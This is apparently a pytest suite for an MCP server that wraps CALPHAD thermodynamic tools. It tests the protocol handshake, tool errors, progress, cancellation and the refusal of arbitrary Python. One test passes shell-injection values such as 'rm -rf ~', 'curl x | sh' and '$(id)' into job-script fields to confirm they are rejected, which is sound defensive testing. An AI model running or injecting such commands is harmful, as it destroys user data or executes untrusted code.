"""calphad-mcp: the toolbox served over MCP stdio.  Each test starts the real server as a subprocess and talks
newline-delimited JSON-RPC to it, the way Claude Code / Codex do: handshake, tool list, calls, images, the clean
stdout guarantee, no arbitrary Python, elicitation, progress and cancellation."""
import json
import os
import queue
import shutil
import subprocess
import sys
import threading
import time
from pathlib import Path

import pytest

from calphad_tools.mcp_server import guide_text

ROOT = Path(__file__).resolve().parent.parent
TDB = ROOT / "examples" / "tdbs" / "CrNi-06Hal.tdb"


class Client:
    """Minimal MCP client: every stdout line must be a JSON-RPC message (a stray print fails the test)."""

    def __init__(self, tmp_path, *args, caps=None, on_request=None, env=None):
        work = tmp_path / "work"
        work.mkdir(exist_ok=True)
        shutil.copy(TDB, work / TDB.name)
        self.work = work
        e = {**os.environ, "CALPHAD_STRUCTURE_ONLINE": "0", "MPLBACKEND": "Agg", **(env or {})}
        self.p = subprocess.Popen([sys.executable, "-m", "calphad_tools.mcp_server", "--config",
                                   str(tmp_path / "none.toml"), "--workdir", str(work), *args],
                                  stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, env=e)
        self.q: "queue.Queue" = queue.Queue()
        self.bad_lines = []
        self.notes = []
        self.on_request = on_request or (lambda m: {"action": "cancel"})
        self.ids = iter(range(1, 10 ** 6))
        threading.Thread(target=self._read, daemon=True).start()
        threading.Thread(target=self.p.stderr.read, daemon=True).start()   # drain
        self.init = self.request("initialize", {"protocolVersion": "2025-06-18", "capabilities": caps or {},
                                                "clientInfo": {"name": "pytest", "version": "0"}})
        self.notify("notifications/initialized")

    def _read(self):
        for raw in self.p.stdout:
            try:
                self.q.put(json.loads(raw))
            except ValueError:
                self.bad_lines.append(raw)

    def send(self, msg):
        self.p.stdin.write((json.dumps(msg) + "\n").encode())
        self.p.stdin.flush()

    def notify(self, method, params=None):
        self.send({"jsonrpc": "2.0", "method": method, **({"params": params} if params else {})})

    def request(self, method, params=None, timeout=120, rid=None):
        rid = rid if rid is not None else next(self.ids)
        self.send({"jsonrpc": "2.0", "id": rid, "method": method, "params": params or {}})
        return self.wait(rid, timeout)

    def wait(self, rid, timeout=120):
        end = time.time() + timeout
        while time.time() < end:
            try:
                m = self.q.get(timeout=0.2)
            except queue.Empty:
                continue
            if "method" in m and "id" in m:                     # server -> client request (elicitation)
                self.send({"jsonrpc": "2.0", "id": m["id"], "result": self.on_request(m)})
            elif "method" in m:
                self.notes.append(m)
            elif m.get("id") == rid:
                return m
        raise TimeoutError(f"no response to {rid}")

    def call(self, name, args=None, **kw):
        r = self.request("tools/call", {"name": name, "arguments": args or {}}, **kw)
        return r["result"]

    def close(self):
        try:
            self.p.stdin.close()
            self.p.wait(10)
        finally:
            if self.p.poll() is None:
                self.p.kill()


@pytest.fixture
def client(tmp_path):
    made = []

    def make(*args, **kw):
        c = Client(tmp_path, *args, **kw)
        made.append(c)
        return c
    yield make
    for c in made:
        c.close()
        assert not c.bad_lines, f"non-JSON on the protocol stream: {c.bad_lines[:3]}"


def _text(result):
    return "\n".join(c["text"] for c in result["content"] if c["type"] == "text")


def test_handshake_and_tool_list(client):
    c = client()
    init = c.init["result"]
    assert init["protocolVersion"] == "2025-06-18"
    assert init["capabilities"]["tools"] == {"listChanged": False}
    assert "Working directory:" in init["instructions"] and "ask_user" not in init["instructions"]
    assert c.request("initialize", {"protocolVersion": "2099-01-01", "capabilities": {}})["result"][
        "protocolVersion"] == "2025-11-25"                                  # unknown -> our newest
    assert c.request("ping")["result"] == {}
    tools = {t["name"]: t for t in c.request("tools/list")["result"]["tools"]}
    assert {"calphad_guide", "tdb_info", "map_phase_diagram", "compare_tdbs", "merge_tdbs"} <= set(tools)
    assert not {"ask_user", "tool_help", "run_python"} & set(tools)   # client asks its user; full schemas
    assert all(t["inputSchema"]["type"] == "object" for t in tools.values())
    assert "description" in json.dumps(tools["map_phase_diagram"]["inputSchema"])   # full: argument docs kept
    assert c.request("resources/list")["result"] == {"resources": []}
    assert c.request("no/such/method")["error"]["code"] == -32601


def test_compact_descriptions_keep_tool_help(client):
    c = client("--tool-descriptions", "compact")
    tools = {t["name"]: t for t in c.request("tools/list")["result"]["tools"]}
    assert "tool_help" in tools and tools["plot_all_ternaries"]["description"].endswith("[tool_help]")
    assert "[tool_help]" in c.init["result"]["instructions"]


def test_calls_results_and_errors(client):
    c = client()
    r = c.call("tdb_info", {"tdb": TDB.name})
    assert not r["isError"] and '"CR"' in _text(r) and '"NI"' in _text(r)
    r = c.call("tdb_info", {"tdb": "NoSuch.tdb"})
    assert r["isError"] and "not found" in _text(r)
    r = c.call("tdb_info", {"tdb": TDB.name, "bogus": 1})
    assert r["isError"] and "bad arguments" in _text(r)
    r = c.call("tdb_inf", {})
    assert r["isError"] and "did you mean tdb_info" in _text(r)
    r = c.call("ask_user", {"question": "?"})
    assert r["isError"]
    g = c.call("calphad_guide")
    assert TDB.name in _text(g) and "Task guidance" in _text(g)


def test_images_attached_for_viewer_tools(client, tmp_path):
    from PIL import Image
    c = client()
    Image.new("RGB", (40, 30), "red").save(c.work / "red.png")
    r = c.call("view_image", {"path": "red.png"})
    imgs = [b for b in r["content"] if b["type"] == "image"]
    assert len(imgs) == 1 and imgs[0]["mimeType"] == "image/png" and imgs[0]["data"]
    assert str((c.work / "red.png").resolve()) in _text(r)               # absolute path for the client's viewer
    c2 = client("--attach-images", "none")
    r = c2.call("view_image", {"path": "red.png"})
    assert [b["type"] for b in r["content"]] == ["text"]


def test_no_arbitrary_python_even_if_the_config_allows_it(client, tmp_path):
    (tmp_path / "cfg.toml").write_text('[agent]\npython_tool = "auto"\n')
    c = client("--config", str(tmp_path / "cfg.toml"))
    names = {t["name"] for t in c.request("tools/list")["result"]["tools"]}
    assert "run_python" not in names
    r = c.call("run_python", {"code": "open('ran.txt', 'w').write('x')"})
    assert r["isError"] and "unknown tool" in _text(r)
    assert not (c.work / "ran.txt").exists()
    assert "no run_python" in c.init["result"]["instructions"]
    assert "--python-tool" not in subprocess.run([sys.executable, "-m", "calphad_tools.mcp_server", "--help"],
                                                 capture_output=True, text=True).stdout


def test_stray_output_never_reaches_the_protocol():
    """After Wire() takes over, print(), raw writes to fd 1 and child processes all land on stderr."""
    code = ("import os, subprocess, sys\n"
            "from calphad_tools.mcp_server import Wire\n"
            "w = Wire()\n"
            "print('print'); sys.stdout.flush()\n"
            "os.write(1, b'raw fd 1\\n')\n"
            "sys.__stdout__.write('dunder stdout\\n'); sys.__stdout__.flush()\n"
            "subprocess.run(['echo', 'child process'])\n"
            "w.send({'jsonrpc': '2.0', 'id': 1, 'result': {}})\n")
    r = subprocess.run([sys.executable, "-c", code], capture_output=True, text=True, timeout=60)
    assert r.returncode == 0, r.stderr
    assert r.stdout.splitlines() == ['{"jsonrpc":"2.0","id":1,"result":{}}']
    for s_ in ("print", "raw fd 1", "dunder stdout", "child process"):
        assert s_ in r.stderr


# ------------------------------------------------------------------ in process: test-only tools in a real server
class MemWire:
    def __init__(self):
        self.sent = []
        self.cv = threading.Condition()

    def send(self, msg):
        with self.cv:
            self.sent.append(msg)
            self.cv.notify_all()

    def wait_for(self, pred, timeout=60):
        end = time.time() + timeout
        with self.cv:
            while True:
                hit = next((m for m in self.sent if pred(m)), None)
                if hit is not None:
                    return hit
                if time.time() > end:
                    raise TimeoutError(f"nothing matched; sent: {self.sent[-5:]}")
                self.cv.wait(0.1)


@pytest.fixture
def inproc(tmp_path, monkeypatch):
    from calphad_tools import mcp_server
    from calphad_tools.agent.config import load_config
    from calphad_tools.agent.llm import ToolSpec
    from calphad_tools.agent.tools import Tool
    monkeypatch.setattr(mcp_server, "HEARTBEAT_S", 0.2)

    def make(caps=None):
        cfg = load_config(str(tmp_path / "none.toml"))
        cfg.agent.workdir, cfg.agent.output_dir = str(tmp_path), "out"
        wire = MemWire()
        srv = mcp_server.MCPServer(cfg, wire)
        srv.handle({"jsonrpc": "2.0", "id": 0, "method": "initialize",
                    "params": {"protocolVersion": "2025-06-18", "capabilities": caps or {}}})
        tb = srv.toolbox()

        def slow(seconds=1.0):
            tb.ui.progress("first step")
            end = time.time() + seconds
            while time.time() < end and not tb.stop_waiting.is_set():
                time.sleep(0.02)
            return ("stopped" if tb.stop_waiting.is_set() else "done"), []

        def asker():
            return f"answer={tb.ui.ask('Which one?', ['a', 'b'])}", []
        any_args = {"type": "object", "properties": {"seconds": {"type": "number"}}}
        tb.tools["slow_tool"] = Tool(ToolSpec("slow_tool", "test", any_args), slow)
        tb.tools["ask_tool"] = Tool(ToolSpec("ask_tool", "test", {"type": "object", "properties": {}}), asker)
        return srv, wire
    return make


def _result(wire, rid):
    return wire.wait_for(lambda m: m.get("id") == rid and "result" in m)["result"]


def test_questions_inside_a_tool_use_elicitation(inproc):
    srv, wire = inproc(caps={"elicitation": {}})
    srv.handle({"jsonrpc": "2.0", "id": 1, "method": "tools/call", "params": {"name": "ask_tool", "arguments": {}}})
    req = wire.wait_for(lambda m: m.get("method") == "elicitation/create")
    assert req["params"]["message"] == "Which one?"
    assert req["params"]["requestedSchema"]["properties"]["answer"]["enum"] == ["a", "b"]
    srv.handle({"jsonrpc": "2.0", "id": req["id"], "result": {"action": "accept", "content": {"answer": "b"}}})
    assert "answer=b" in _text(_result(wire, 1))


def test_questions_without_elicitation_get_the_non_interactive_answer(inproc):
    srv, wire = inproc()
    srv.handle({"jsonrpc": "2.0", "id": 1, "method": "tools/call", "params": {"name": "ask_tool", "arguments": {}}})
    assert "state the assumption" in _text(_result(wire, 1))
    assert not any(m.get("method") == "elicitation/create" for m in wire.sent)


def test_progress_heartbeat_and_cancellation(inproc):
    srv, wire = inproc()
    srv.handle({"jsonrpc": "2.0", "id": 1, "method": "tools/call",
                "params": {"name": "slow_tool", "arguments": {"seconds": 0.8}, "_meta": {"progressToken": "tok"}}})
    assert _text(_result(wire, 1)) == "done"
    prog = [m["params"] for m in wire.sent if m.get("method") == "notifications/progress"]
    assert prog[0]["message"] == "first step" and len(prog) >= 2              # status line + heartbeat(s)
    assert all(p["progressToken"] == "tok" for p in prog)
    assert [p["progress"] for p in prog] == sorted(p["progress"] for p in prog)

    # cancelling sets stop_waiting (ends a wait_job); the cancelled call gets no response, the next one does
    srv.handle({"jsonrpc": "2.0", "id": 2, "method": "tools/call",
                "params": {"name": "slow_tool", "arguments": {"seconds": 30}}})
    time.sleep(0.3)
    srv.handle({"jsonrpc": "2.0", "method": "notifications/cancelled", "params": {"requestId": 2}})
    srv.handle({"jsonrpc": "2.0", "id": 3, "method": "tools/call",
                "params": {"name": "slow_tool", "arguments": {"seconds": 0.1}}})
    assert _text(_result(wire, 3)) == "done"
    assert not any(m.get("id") == 2 for m in wire.sent)


@pytest.mark.parametrize("flux, run_name, bad", [
    ({"queue": "pbatch\nrm -rf ~"}, "r1", "queue"),
    ({"bank": "b; curl x | sh"}, "r1", "bank"),
    ({"time_limit": "$(id)"}, "r1", "time_limit"),
    ({"nodes": "1; reboot"}, "r1", "nodes"),
    ({"job_prefix": "a b"}, "r1", "job_prefix"),
    ({}, "x && rm -rf ~", "run name"),
])
def test_flux_script_values_cannot_inject_shell(tmp_path, flux, run_name, bad):
    from calphad_tools import espei_flux
    fs = espei_flux.FluxSettings(**{"setup": [], **flux})
    run = espei_flux.Run(name=run_name, phase_models="pm.json", datasets="ds")
    for build in (lambda: espei_flux.gen_script(fs, run), lambda: espei_flux.mcmc_script(fs, run),
                  lambda: espei_flux.bundle_script(fs, [run])):
        with pytest.raises(ValueError, match=bad):
            build()
    ok = espei_flux.FluxSettings(setup=[], queue="pbatch", bank="mybank", time_limit="1:30:00",
                                 bank_flag="--setattr=system.bank")
    assert "#flux: -q pbatch" in espei_flux.mcmc_script(ok, espei_flux.Run(name="CrNi_v2.1", phase_models="p",
                                                                           datasets="d"))


def test_guide_text_adapts_the_agent_prompt():
    full = guide_text("/data", "calphad_outputs", compact=False)
    for gone in ("ask_user", "report_problem", "package_feedback", "no internet", "[tool_help]",
                 "run_python (persistent", "Arbitrary Python is disabled"):
        assert gone not in full
    assert "no run_python" in full and "your own tools" in full and "show_code" in full
    assert "Do not pretend a partial result is complete" in full
    assert "[tool_help]" in guide_text("/data", "calphad_outputs", compact=True)
